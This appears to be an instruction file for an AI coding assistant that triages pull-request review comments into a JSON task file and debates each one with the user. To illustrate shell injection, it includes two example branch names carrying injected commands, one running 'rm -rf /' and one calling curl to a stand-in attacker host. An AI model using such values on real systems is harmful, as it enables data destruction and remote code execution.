# PR Review Triage

Triage PR review comments (CodeRabbit, Greptile, human reviewers) into actionable tasks, then walk through each one interactively with the user. Works for a single PR or a full staccato stack.

## Input

`$ARGUMENTS` — optional. Accepts any of:

- A **PR number** (e.g. `142`) — triage that single PR.
- A **PR URL** (e.g. `https://github.com/acme/app/pull/142`) — triage that single PR.
- The literal keyword `stack` — triage the whole stack from trunk to the current branch.
- **Omitted** — default to the current branch's PR. If the branch is part of a staccato stack (detected via the `st_reviews` MCP tool or the presence of `.git/stack/` / `refs/staccato/`), ask the user whether they want single-PR or stack scope.

## Process

A 3-phase workflow: **Extract → Investigate → Triage Loop**.

### Phase 1: Extract

Pull all comments from the PR(s) and structure them into a task file.

#### Resolve scope

Derive `(mode, pr_numbers)` from `$ARGUMENTS`:

- PR number / URL → `mode=single`, one PR number.
- `stack` → `mode=stack`, all PRs from trunk to current branch (ancestor-first).
- Omitted → current branch's PR. Detect staccato (`st_reviews` MCP available, or `.git/stack/` / `refs/staccato/` present). If detected, ask: *"This branch is part of a stack. Triage the single PR or the full stack?"*

#### Pull comments — preferred: `st_reviews` MCP

Use `st_reviews` when the staccato MCP server is connected:

- **Single PR:** `st_reviews(scope: 'current')` — reviews for the current branch's PR.
- **Stack:** `st_reviews(scope: 'to-current')` — reviews for all PRs from trunk to the current branch.

`st_reviews` returns unified markdown containing all review comments. Parse the comment blocks to extract: file path, line range, reviewer name, and comment body.

#### Pull comments — fallback: `gh api`

When staccato is unavailable, fetch comments directly:

```bash
# Review comments (inline code comments)
gh api repos/{owner}/{repo}/pulls/{number}/comments --paginate

# Review summaries (approve/request-changes bodies)
gh api repos/{owner}/{repo}/pulls/{number}/reviews --paginate

# General issue-style comments
gh api repos/{owner}/{repo}/issues/{number}/comments --paginate
```

For a stack without staccato, repeat ancestor-first for each PR.

#### Parse into tasks

For each actionable comment:

1. Identify the **source** — CodeRabbit, Greptile, or a human reviewer (use login/author name).
2. Extract the **file** and **line range** from the comment's `path`, `line`, `start_line`.
3. Assess **severity**: `critical` > `major` > `minor` > `nitpick`.
4. Assign a **category**: `security`, `correctness`, `feature-regression`, `code-quality`, `performance`, `testing`.
5. Write a concise **title** (imperative mood, under 80 chars).
6. Write a **description** that captures the specific problem and suggested fix.
7. For stack mode: record `pr_number` on each task so it's traceable to its source PR.

Merge duplicates — multiple reviewers often flag the same issue. Combine into one task citing all sources (`"coderabbit + greptile"`).

#### Batch similar tasks

After parsing all comments into tasks, group tasks that share the same corrective action:

1. **Identify batches** — look for tasks whose titles and descriptions describe the same fix applied to different locations. Match on the *corrective action pattern* (key phrases in title/description), NOT just matching category or severity.
   - Example: 3 tasks all saying "replace execSync with execFileSync" in different files → one batch.
   - Example: 4 tasks all saying "add input validation for user-supplied string" → one batch.
   - Counter-example: 2 security tasks with different fixes (one injection, one auth) → NOT a batch.
2. **Minimum 2 tasks** to form a batch.
3. **Assign batch IDs** — `B1`, `B2`, etc.
4. **Sort batches** by highest severity member first.
5. **Record** `batch_id` on each member task and add the `batches` index to the JSON.

#### Write the tasks file

**File naming:**

- Single PR: `pr-{number}-tasks.json`
- Stack: `pr-{n,n,n,n}-stack.json` (comma-separated PR numbers, ancestor-first)

Save to the project root. See the **Task File Schema** appendix below for the full structure.

Sort tasks by severity (critical first), then by file path. Assign sequential IDs starting at 1.

Include a `summary` block with counts by severity and category so the user gets an instant overview. For stack mode, also include `by_pr` breakdowns.

The tasks file is a working artifact — it lives in the project root but isn't committed.

### Phase 2: Investigate

Before presenting each task (or batch), check whether it's already been addressed:

1. **Read the current file** at the referenced lines.
2. **Search for the fix** — look for the specific change the comment suggests (e.g. `execFileSync` replacing `execSync`, added validation, etc.).
3. **Check recent commits** — `git log --oneline -10 -- {file}` to see if changes were made after the review.

If the fix is already in place, mark the task `completed` in the JSON and move to the next one. Tell the user it's already done and briefly explain what you found. For batched tasks, if all members are already fixed, mark the entire batch `completed`.

### Phase 3: Triage Loop

Present **batches first**, then remaining individual tasks. For each item:

#### Batch presentation

When a group of tasks forms a batch, present them together:

```
## Batch B1 — [{severity}] {pattern title} (N tasks across M files)
**Pattern:** {what these have in common}
**Affected files:**
- `file1.ts:15-29` — {brief context}
- `file2.ts:41-48` — {brief context}

**The problem:** {explained once}
**Suggested fix:** {the fix pattern, once}
```

**Batch decision rules:**

- Accept or dismiss applies to all batch members by default.
- User can say "only fix file1" or "only dismiss task 9" → that item gets its own individual status, the rest keep the batch decision.
- Update all affected tasks in JSON after each batch decision.

#### Individual task presentation

For non-batched tasks (or items split out of a batch), present one at a time:

```
## Task {id}/{total} — [{severity}] {title}
**File:** `{file}:{lines}` | **Source:** {source} | **Category:** {category}

**The problem:** {plain-language explanation}

**How it could happen:** {concrete scenario showing how this issue manifests}

**What happens if left unchecked:** {realistic consequence}

**Suggested fix:** {specific code change or approach}
```

The goal is the user understands the issue well enough to make an informed decision. Use concrete examples — "an attacker could craft a branch name like `feat/x; rm -rf /`" is better than "this could allow injection."

#### Ask for a decision

After presenting (batch or individual), ask:

> Accept or dismiss? If you have ideas on the fix approach or want to dismiss, share your reasoning.

#### Handle the response

**If accepted:**

- Set `status: "accepted"` in the tasks JSON (all batch members if batch decision).
- If the user proposed a fix approach, evaluate it honestly — don't just validate. If their approach has a flaw, misses the point, or introduces a new problem, say so. Debate it the same way you'd debate a dismissal. Once agreed, record it in `resolution` on the task.
- Move to the next task or batch.

**If dismissed — debate when warranted:**

When the user wants to dismiss, engage in a real debate *if there's genuine substance to discuss*.

1. **Understand their reasoning first** — ask why if they didn't explain.
2. **Challenge with specifics** — don't say "are you sure?" Construct a concrete scenario: "A branch named `feat/x$(curl attacker.com)` would execute arbitrary commands in CI. Since this runs on PRs from forks, any external contributor could trigger it."
3. **Go back and forth** — if the user's counter-argument has a gap, point it out. Surface hidden assumptions. Show where an intuition is being treated as a fact. Keep going as long as there's genuine substance to discuss.
4. **But don't argue for argument's sake** — if the reasoning is sound, say so and move on. The depth of debate should match the stakes. A critical security issue warrants multiple rounds. A minor code-quality preference doesn't.

Don't debate nitpicks or style issues — those are legitimately subjective.

#### Cognitive biases to watch for

These apply to both accepts and dismissals — any time the user gives a rationale or proposes an approach:

- **Assumptions treated as facts** — "that can't happen" without evidence.
- **Scope dismissal** — "nobody would do that" when the attack surface is public.
- **Effort bias** — dismissing because the fix seems hard, not because the issue is invalid.
- **Anchoring** — over-weighting the reviewer's framing or under-weighting it.

When the debate reaches a genuine conclusion — either the user convinced you, you convinced them, or you've both explored it fully — record the decision and move on.

#### Update the JSON

After each decision, update the tasks file:

- Accepted tasks: set `status: "accepted"`, add `resolution` with the user's decision and proposed fix (if any).
- Dismissed tasks: move from `tasks` to the `dismissed` array with `dismissed_by` and `reason`.
- Completed tasks (already fixed): set `status: "completed"`, add `resolution` noting what was found.
- Batch decisions: update the `batches` index status and all member tasks.
- Update the `summary` counts.

#### Progress tracking

After each task or batch decision, show a brief progress line:

```
[8/20] 4 accepted (incl. B1: 3 tasks), 2 completed, 1 dismissed, 13 remaining
```

When batches are involved, note them in the count so the user sees how many individual tasks each batch decision covered.

### After Triage

When all tasks are processed:

1. Show a final summary — accepted vs dismissed vs completed counts (with per-PR breakdown for stacks).
2. Ask if the user wants to start working through accepted tasks now.
3. The tasks file serves as the work queue — accepted tasks can be tackled in severity order.

### Edge Cases

- **PR with no actionable comments:** Report that the PR looks clean, no tasks file needed.
- **Resuming a partial triage:** Read the existing tasks file (`pr-{number}-tasks.json` or `pr-{n,n,n,n}-stack.json`), skip completed/dismissed/accepted tasks, resume from the first `pending` task or batch.
- **Resuming stack triage:** Same as above — read the stack file, skip decided tasks, resume from first `pending`.
- **Partial batch override:** When a user overrides individual items within a batch, those items get their own status while `batch_id` is preserved for audit trail.
- **Schema drift on resume:** Handle both flat `"pr": 467` and object `"pr": {...}` shapes gracefully — existing files may use either format.
- **Comments on deleted files:** Mark as `completed` with a note that the file was removed.
- **Conflicting reviewer opinions:** Present both perspectives, let the user decide.

---

## Task File Schema

### File Naming

- **Single PR:** `pr-{number}-tasks.json`
- **Stack:** `pr-{n,n,n,n}-stack.json` (comma-separated PR numbers, ancestor-first)

### Structure

#### Single PR mode

```json
{
  "pr": {
    "number": 142,
    "title": "feat: add OAuth2 token refresh flow",
    "url": "https://github.com/acme/app/pull/142"
  },
  "tasks": [
    {
      "id": 1,
      "severity": "critical",
      "category": "security",
      "file": "src/api/auth.ts",
      "lines": "15-29",
      "source": "coderabbit",
      "title": "Replace execSync with execFileSync to prevent shell injection",
      "description": "execSync interpolates user input into a shell string. Use execFileSync to pass arguments as an array without shell interpretation.",
      "status": "accepted",
      "resolution": "Use execFileSync across all scripts. Also wrap in try/catch with context-rich error messages.",
      "batch_id": "B1"
    },
    {
      "id": 2,
      "severity": "critical",
      "category": "security",
      "file": "src/utils/fetch.ts",
      "lines": "41-48",
      "source": "coderabbit",
      "title": "Replace execSync with execFileSync in fetch utility",
      "description": "Same shell injection risk as src/api/auth.ts — execSync interpolates arguments unsafely.",
      "status": "accepted",
      "resolution": "Use execFileSync across all scripts.",
      "batch_id": "B1"
    },
    {
      "id": 3,
      "severity": "major",
      "category": "correctness",
      "file": "src/api/auth.ts",
      "lines": "51-57",
      "source": "coderabbit",
      "title": "Handle expired refresh token gracefully",
      "description": "When the refresh token is expired, the current code throws an unhandled error. Return a Result type or redirect to login.",
      "status": "completed",
      "resolution": "Already fixed in e7eeec0 — error handling added for expired tokens."
    }
  ],
  "dismissed": [
    {
      "file": "src/config/env.ts",
      "source": "greptile",
      "title": "Move API base URL to environment variable",
      "dismissed_by": "jdoe",
      "reason": "Already configured via config.json — env var would be redundant"
    }
  ],
  "batches": {
    "B1": {
      "title": "Replace execSync with execFileSync to prevent shell injection",
      "task_ids": [1, 2],
      "status": "accepted"
    }
  },
  "summary": {
    "total_tasks": 15,
    "by_severity": {
      "critical": 5,
      "major": 7,
      "minor": 2,
      "nitpick": 1
    },
    "by_category": {
      "security": 4,
      "correctness": 6,
      "feature-regression": 1,
      "code-quality": 3,
      "performance": 0,
      "testing": 1
    },
    "accepted": 0,
    "completed": 0,
    "dismissed": 1
  }
}
```

#### Stack mode

In stack mode, `prs` replaces `pr` (mutually exclusive), and each task carries a `pr_number`:

```json
{
  "prs": [
    {
      "number": 140,
      "title": "refactor: extract auth module",
      "url": "https://github.com/acme/app/pull/140"
    },
    {
      "number": 141,
      "title": "feat: add login screen",
      "url": "https://github.com/acme/app/pull/141"
    },
    {
      "number": 142,
      "title": "feat: add OAuth2 token refresh flow",
      "url": "https://github.com/acme/app/pull/142"
    }
  ],
  "tasks": [
    {
      "id": 1,
      "severity": "critical",
      "category": "security",
      "file": "src/api/auth.ts",
      "lines": "15-29",
      "source": "coderabbit",
      "title": "Validate redirect URI against allowlist",
      "description": "The OAuth redirect URI is taken from user input without validation, enabling open redirect attacks.",
      "status": "pending",
      "pr_number": 142
    },
    {
      "id": 2,
      "severity": "major",
      "category": "correctness",
      "file": "src/auth/session.ts",
      "lines": "22-30",
      "source": "greptile",
      "title": "Clear session storage on logout",
      "description": "Session tokens persist in storage after logout. Call storage.clear() in the logout handler.",
      "status": "pending",
      "pr_number": 141
    }
  ],
  "dismissed": [],
  "batches": {},
  "summary": {
    "total_tasks": 19,
    "by_severity": {
      "critical": 3,
      "major": 9,
      "minor": 5,
      "nitpick": 2
    },
    "by_category": {
      "security": 4,
      "correctness": 8,
      "feature-regression": 1,
      "code-quality": 4,
      "performance": 1,
      "testing": 1
    },
    "by_pr": {
      "140": { "total": 5, "accepted": 0, "dismissed": 0, "completed": 0 },
      "141": { "total": 7, "accepted": 0, "dismissed": 0, "completed": 0 },
      "142": { "total": 7, "accepted": 0, "dismissed": 0, "completed": 0 }
    },
    "accepted": 0,
    "completed": 0,
    "dismissed": 0
  }
}
```

### Field Reference

#### `pr` (single PR mode)

| Field    | Type   | Description     |
| -------- | ------ | --------------- |
| `number` | number | PR number       |
| `title`  | string | PR title        |
| `url`    | string | Full GitHub URL |

#### `prs` (stack mode, replaces `pr`)

Array of PR objects, ordered ancestor-first. Same fields as `pr` above. Mutually exclusive with `pr`.

#### `tasks[]`

| Field         | Type   | Description                                                                                                    |
| ------------- | ------ | -------------------------------------------------------------------------------------------------------------- |
| `id`          | number | Sequential ID (1-based), ordered by severity then file path                                                    |
| `severity`    | string | `critical` \| `major` \| `minor` \| `nitpick`                                                                  |
| `category`    | string | `security` \| `correctness` \| `feature-regression` \| `code-quality` \| `performance` \| `testing`            |
| `file`        | string | Relative file path from repo root                                                                              |
| `lines`       | string | Line range (`"15-29"`) or `"N/A"` if not line-specific                                                         |
| `source`      | string | Reviewer: `coderabbit`, `greptile`, GitHub username, or combined (`"coderabbit + greptile"`)                   |
| `title`       | string | Imperative-mood summary, under 80 chars                                                                        |
| `description` | string | Problem + suggested fix in 1-2 sentences                                                                       |
| `status`      | string | `pending` \| `accepted` \| `completed` \| `dismissed`                                                          |
| `resolution`  | string | (optional) User's decision, proposed fix approach, or what was found for completed tasks. Added during triage. |
| `batch_id`    | string | (optional) Batch identifier (`"B1"`, `"B2"`, etc.). Present when task is part of a batch.                      |
| `pr_number`   | number | (optional, stack mode only) Which PR this task came from.                                                      |

#### `dismissed[]`

Dismissed tasks are moved out of `tasks[]` into this array with additional audit fields:

| Field          | Type   | Description                        |
| -------------- | ------ | ---------------------------------- |
| `file`         | string | Same as task `file`                |
| `source`       | string | Same as task `source`              |
| `title`        | string | Same as task `title`               |
| `dismissed_by` | string | Who dismissed it (GitHub username) |
| `reason`       | string | Why it was dismissed               |

#### `batches` (optional top-level)

Index of task batches — groups of tasks that share the same corrective action. Keyed by batch ID.

| Field      | Type     | Description                                                      |
| ---------- | -------- | ---------------------------------------------------------------- |
| `title`    | string   | Description of the shared corrective action                      |
| `task_ids` | number[] | IDs of tasks in this batch                                       |
| `status`   | string   | `pending` \| `accepted` \| `completed` \| `dismissed` \| `mixed` |

`mixed` status means the user overrode individual items — some accepted, some dismissed. Check member tasks for individual statuses.

#### `summary`

Running totals updated after each triage decision. `total_tasks` counts everything including dismissed.

#### `summary.by_pr` (stack mode only)

Per-PR breakdown of task counts. Keyed by PR number (as string). Each entry contains:

| Field       | Type   | Description                       |
| ----------- | ------ | --------------------------------- |
| `total`     | number | Total tasks from this PR          |
| `accepted`  | number | Tasks accepted                    |
| `dismissed` | number | Tasks dismissed                   |
| `completed` | number | Tasks already fixed before triage |

### Severity Guide

| Level      | Criteria                                                               |
| ---------- | ---------------------------------------------------------------------- |
| `critical` | Security vulnerability, data loss risk, or runtime crash in production |
| `major`    | Incorrect behavior, missing validation, or feature regression          |
| `minor`    | Code quality, missing best practice, or minor inconsistency            |
| `nitpick`  | Style preference, naming suggestion, or optional improvement           |
